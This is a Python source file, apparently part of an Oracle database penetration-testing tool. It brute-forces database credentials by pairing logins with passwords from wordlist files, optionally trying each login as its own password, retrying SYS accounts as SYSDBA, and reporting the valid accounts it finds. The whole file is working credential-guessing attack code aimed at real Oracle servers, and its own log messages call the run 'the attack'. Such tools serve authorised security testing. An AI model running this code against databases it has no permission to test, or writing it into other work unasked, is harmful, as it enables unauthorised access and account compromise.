#!/usr/bin/python
# -*- coding: utf-8 -*-

from OracleDatabase import OracleDatabase
from time import sleep
import logging, os.path
from Constants import *
from Utils import sidHasBeenGiven, stringToLinePadded, getCredentialsFormated

class PasswordGuesser (OracleDatabase):
	'''
	Password guesser
	'''
	def __init__(self,args,accountsFile,loginFile,passwordFile,loginAsPwd,timeSleep=0):
		'''
		Constructor
		'''
		OracleDatabase.__init__(self,args)
		self.accountsFile = accountsFile
		self.loginFile = loginFile
		self.passwordFile = passwordFile
		self.loginAsPwd = loginAsPwd
		if self.accountsFile == '' : self.accounts = []
		else : self.accounts = self.__getAccounts__()
		self.valideAccounts = {}
		self.args['SYSDBA'] = False
		self.args['SYSOPER'] = False
		self.timeSleep = timeSleep
		
	def getAccountsFromFile (self):
		'''
		return list which contains accounts
		'''
		return self.accounts

	def __getAccounts__(self):
		'''
		return list containing accounts
		'''
		accounts = []
		logins, passwords, loginsAsPwdsLowercase, loginsAsPwdsUppercase = [], [], {}, {}
		if self.accountsFile != None:
			logging.info('Loading accounts stored in the {0} file'.format(self.accountsFile))
			f = open(self.accountsFile)
			for l in f:
				lsplit = l.replace('\n','').replace('\t','').split('/')
				if isinstance(lsplit,list) and len(lsplit) == 2 : 
					accounts.append([lsplit[0],lsplit[1]])
					if lsplit[0] not in logins:
						logins.append(lsplit[0])
						loginsAsPwdsLowercase[lsplit[0]]=False
						loginsAsPwdsUppercase[lsplit[0]]=False
					if lsplit[0] == lsplit[1].lower(): 
						if loginsAsPwdsLowercase[lsplit[0]]==False: 
							loginsAsPwdsLowercase[lsplit[0]]=True
					if lsplit[0] == lsplit[1].upper():
						if loginsAsPwdsUppercase[lsplit[0]]==False: 
							loginsAsPwdsUppercase[lsplit[0]]=True
			f.close()
		else:
			logging.info('Loading logins stored in {0} and passwords stored in {1}'.format(self.loginFile, self.passwordFile))
			f = open(self.loginFile)
			for l in f: 
				aLogin = l.replace('\n','').replace('\t','')
				if aLogin not in logins: 
					logins.append(aLogin)
					loginsAsPwdsLowercase[aLogin]=False
					loginsAsPwdsUppercase[aLogin]=False
			f.close()
			f = open(self.passwordFile)
			for l in f: passwords.append(l.replace('\n','').replace('\t',''))
			f.close()
			for aLogin in logins:
				for aPwd in passwords:
					accounts.append([aLogin,aPwd])
					if aLogin == aPwd.lower(): 
						if loginsAsPwdsLowercase[aLogin]==False: 
							loginsAsPwdsLowercase[aLogin]=True
					if aLogin == aPwd.upper():
						if loginsAsPwdsUppercase[aLogin]==False: 
							loginsAsPwdsUppercase[aLogin]=True
		if self.loginAsPwd == True:
			logging.info('Each login not in credentials list is appended as password (in lowercase and uppercase)'.format())
			for aLogin in logins:
				if loginsAsPwdsLowercase[aLogin]==False:
					accounts.append([aLogin,aLogin.lower()])
				if loginsAsPwdsUppercase[aLogin]==False:
					accounts.append([aLogin,aLogin.upper()])
		logging.info ("{0} paired login/password loaded".format(len(accounts)))
		return accounts

	def searchValideAccounts(self):
		'''
		Search valide accounts
		'''
		userChoice = 1 
		logging.info("Searching valid accounts on {0}:{1}/{2}".format(self.args['server'], self.args['port'], self.args['sid']))
		pbar,nb = self.getStandardBarStarted(len(self.accounts)), 0
		for anAccount in self.accounts :
			nb += 1
			pbar.update(nb)
			self.args['SYSDBA'] = False
			self.args['SYSOPER'] = False
			logging.debug("Try to connect with {0}".format('/'.join(anAccount)))
			self.args['user'], self.args['password'] = anAccount[0], anAccount[1]
			self.__generateConnectionString__()
			status = self.__saveThisLoginInFileIfNotExist__(self.args['user'])
			if self.args['force-retry'] == False and status == False and userChoice ==1: 
				userChoice = self.__askToTheUserIfNeedToContinue__(self.args['user'])
			if userChoice == 0 : 
				logging.info("The attack is aborded because you choose to stop (s/S)")
				break
			status = self.connection(threaded=False)
			if status == True:
				self.valideAccounts[self.args['user']] = self.args['password']
				logging.info("Valid credential: {0} ({1})  ".format('/'.join(anAccount),self.args['connectionStr']))
				self.args['print'].goodNews(stringToLinePadded("Valid credentials found: {0}. Continue... ".format('/'.join(anAccount))))
			elif "connection as SYS should be as SYSDBA or SYSOPER" in str(status):
				logging.debug("Try to connect as sysdba")
				self.args['SYSDBA'] = True
				status = self.connection()
				if status == True:
					self.valideAccounts[self.args['user']] = self.args['password']
					logging.info("Valid credential: {0} ({1})  ".format('/'.join(anAccount),self.args['connectionStr']))
				self.args['SYSDBA'] = False
			elif self.__needRetryConnection__(status) == True:
				status = self.__retryConnect__(nbTry=4)
			else:
				logging.debug("Error during connection with this account: {0}".format(status))
			self.close()
			sleep(self.timeSleep)
		pbar.finish()
		return True

	def __saveThisLoginInFileIfNotExist__(self,login):
		''' 
		Save this login in the trace file to known if this login has already been tested
		If the login is in the file , return False. Otherwise return True
		'''
		if self.args.has_key('loginTraceFile') == False:
			self.args['loginTraceFile'] = "{0}-{1}-{2}{3}".format(self.args['server'],self.args['port'],self.args['sid'],PASSWORD_EXTENSION_FILE)
			if os.path.isfile(self.args['loginTraceFile']) == False:
				f=open(self.args['loginTraceFile'],'w')
				f.close()
				logging.info("The {0} file has been created".format(self.args['loginTraceFile']))
		f=open(self.args['loginTraceFile'],'r')
		for l in f:
			aLoginInFile = l.replace('\n','')
			if login == aLoginInFile :
				f.close() 
				return False
		f.close()
		f=open(self.args['loginTraceFile'],'a')
		f.write('{0}\n'.format(login))
		f.close()
		return True

	def __askToTheUserIfNeedToContinue__(self,login):
		'''
		Ask to the user if the module need to continue
		return:
		- 0 : stop (no)
		- 1 : continue and ask again (yes)
		- 2 : continue without ask (yes) 
		'''
		def askToContinue ():
			rep = raw_input("The login {0} has already been tested at least once. What do you want to do:\n- stop (s/S)\n- continue and ask every time (a/A)\n- continue without to ask (c/C)\n".format(login))
			if rep == 's' or rep == 'S' : return 0
			elif rep == 'a' or rep == 'A' : return 1
			elif rep == 'c' or rep == 'C' : return 2
			else : return -1
		rep = askToContinue()
		while (rep==-1):
			rep = askToContinue()
		return rep

def runPasswordGuesserModule(args):
	'''
	Run the PasswordGuesser module
	'''
	if sidHasBeenGiven(args) == False : return EXIT_MISS_ARGUMENT
	args['print'].title("Searching valid accounts on the {0} server, port {1}".format(args['server'],args['port']))
	if args['accounts-files'][0] != None and args['accounts-files'][1] != None : args['accounts-file'] = None
	passwordGuesser = PasswordGuesser(args, accountsFile=args['accounts-file'], loginFile=args['accounts-files'][0], passwordFile=args['accounts-files'][1], timeSleep=args['timeSleep'], loginAsPwd=args['login-as-pwd'])
	passwordGuesser.searchValideAccounts()
	validAccountsList = passwordGuesser.valideAccounts
	if validAccountsList == {}:
		args['print'].badNews("No found a valid account on {0}:{1}/{2}. You should try with the option '--accounts-file accounts/accounts_multiple.txt' or '--accounts-file accounts/logins.txt accounts/pwds.txt'".format(args['server'], args['port'], args['sid']))
	else :
		args['print'].goodNews("Accounts found on {0}:{1}/{2}: {3}".format(args['server'], args['port'], args['sid'],getCredentialsFormated(validAccountsList)))



